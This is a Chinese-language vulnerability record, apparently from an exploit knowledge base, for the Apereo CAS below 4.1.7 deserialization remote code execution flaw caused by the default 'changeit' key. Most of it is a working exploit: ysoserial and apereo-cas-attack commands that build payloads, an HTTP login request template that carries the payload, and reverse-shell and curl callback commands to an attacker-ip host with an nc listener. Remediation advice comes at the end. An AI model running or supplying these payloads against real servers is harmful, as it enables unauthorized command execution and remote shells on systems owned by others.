---
id: APEREO-CAS-4.1-RCE
title: Apereo CAS 4.1 反序列化命令执行漏洞
product: apereo-cas
vendor: Apereo
version_affected: "<4.1.7"
severity: CRITICAL
tags: [rce, deserialization, 需要认证]
fingerprint: ["Apereo CAS", "CAS"]
---

## 漏洞描述

Apereo CAS 4.1.7之前版本存在默认密钥问题。Webflow中使用了默认密钥 `changeit`，攻击者可以利用这个密钥构造恶意信息触发目标反序列化漏洞，执行任意命令。

## 影响版本

- Apereo CAS < 4.1.7

## 前置条件

- 能够访问CAS登录页面
- 需要知道一个有效用户（任意用户可触发）

## 利用步骤

1. 使用ysoserial的CommonsCollections4生成加密后的Payload
2. 登录CAS并抓包获取execution参数值
3. 将Payload替换到execution参数发送
4. 服务器反序列化Payload后执行命令

## Payload

```bash
# 使用Apereo-CAS-Attack工具生成payload
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"

# 或手动使用ysoserial
java -jar ysoserial.jar CommonsCollections4 "touch /tmp/success" > payload.bin
```

```http
POST /cas/login HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=xxx

username=test&password=test&lt=LT-xxx&execution=[ysoserial_payload]&_eventId=submit&submit=LOGIN
```

```bash
# 生成反弹shell payload
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "bash -i >& /dev/tcp/attacker-ip/port 0>&1"
```

## 验证方法

```bash
# 此漏洞为deserialization RCE，需要使用反弹shell或HTTP外带验证
# 攻击者服务器启动监听
nc -lvp 4444

# 使用反弹shell payload
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "bash -i >& /dev/tcp/attacker-ip/4444 0>&1"
# 然后发送payload到/cas/login

# 或使用HTTP外带验证（推荐，攻击者服务器启动: python3 -m http.server 8080）
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "curl http://attacker-ip:8080/whoami"
# 然后发送payload
# 检查HTTP服务器日志是否有回连
```

## 修复建议

1. 升级Apereo CAS至4.1.7或更高版本
2. 修改默认密钥changeit为随机值
3. 启用serializableMessageGate拦截器
4. 限制反序列化类的白名单
